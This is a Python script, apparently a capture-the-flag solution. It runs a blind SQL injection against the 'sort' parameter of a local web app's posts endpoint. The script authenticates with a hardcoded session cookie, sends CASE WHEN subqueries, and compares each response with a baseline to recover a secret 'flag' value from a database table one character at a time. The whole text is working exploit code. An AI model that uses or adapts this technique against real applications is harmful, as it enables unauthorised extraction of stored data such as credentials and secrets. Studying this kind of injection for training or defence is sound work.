import string
import requests
import urllib.parse

# Create an array with all letters and numbers
array = list(string.ascii_letters + string.digits)
array.extend(list("{}()_-$@!#"))

url = "http://localhost:8000/posts/my_posts?sort="

# Define the session ID (replace with your actual session ID)
cookies = {"sessionid": "wtncl32u1y4820dw6a1v9463x6gb5ewz"}

req_with_title = requests.get(url + "title", cookies=cookies).text

flag = ""
print("#### Start Exploit")

for i in range(1, 45):
    for l in array:
        payload = f"CASE WHEN (select BINARY SUBSTRING(flag,1,{i}) from flag) = '{flag+l}' THEN title ELSE category END"
        encoded_payload = urllib.parse.quote_plus(payload)  # Encode the payload properly

        req = requests.get(url + encoded_payload, cookies=cookies)
        if req.text == req_with_title:
            flag += l
            print(f"Current flag: {flag}")
            break
    if flag[-1] == '}':
        break

print(f"Final flag: {flag}")

